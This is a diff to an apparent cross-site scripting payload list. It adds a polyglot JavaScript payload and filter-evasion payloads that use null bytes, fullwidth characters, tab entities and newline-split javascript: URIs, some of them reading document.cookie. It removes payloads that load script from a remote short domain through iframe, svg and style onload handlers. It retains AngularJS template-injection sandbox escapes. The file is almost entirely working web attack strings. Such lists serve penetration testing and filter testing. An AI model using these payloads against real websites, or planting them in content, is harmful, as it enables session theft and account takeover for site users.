@@ -1,3 +1,4 @@
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 {{‘a’.constructor.prototype.charAt=[].join;$eval(‘x=1} } };alert(document.domain)//’);}} )
 {{constructor.constructor('alert(1)')()}}                          
 {{this.construct.construct('alert("foo")')()}}
@@ -112,22 +113,15 @@ JavaScript://%250Dtop.confirm(1)//?1
 <Img Src=//X55.is OnLoad=import(src)>
 alert?.(document?.domain)[document?.domain]?.map?.(alert)
 top?.[/ale/?.source+/rt/?.source]?.(document?.[/dom/?.source+/ain/?.source])
-`#/*<iframe/onload="/*'/**/;alert(document.domain)//">`
-<script/src=//Ǌ.₨><\/script>
-<iframe/onload=src=top.name>
-<iframe/onload=src=top[0].name+/\\Ǌ.₨/>
-<iframe/onload=src=contentWindow.name+/\\Ǌ.₨/>
-<iframe/srcdoc="<script/src=//Ǌ.₨><\/script>">
-<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">
-<iframe/onload=eval(`'`+URL)>
-<iframe/onload=write(URL)>
-<svg/onload=eval(name)>
-<svg/onload=eval(`'`+URL)>
-<svg/onload=location=name>
-<style/onload=eval(name)>
-<style/onload=write(URL)>
-<style/onload=eval(`'`+URL)>
-<style/onerror=eval(name)>
-<svg/onload=import(/\\Ǌ.₨/)>
-<style/onload=import(/\\Ǌ.₨/)>
-<iframe/onload=import(/\\Ǌ.₨/)>
+%EF%BC%9C/script%ef%bc%9e%EF%BC%9Cscript%ef%bc%9econfirm%601%60%EF%BC%9C/script%ef%bc%9e
+"><On%00click=prompt(document.cookie)>
+"><img sr%00c=x o%00nerror=prompt(document.cookie)>
+"><On%00mouseover=prompt(document.cookie)>
+<!<script>confirm(1)</script>
+<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<a href=&#01javascript:alert(1)>
+<a href=javascript&colon;confirm(1)>
+<a href="jav%0Dascript&colon;alert(1)">
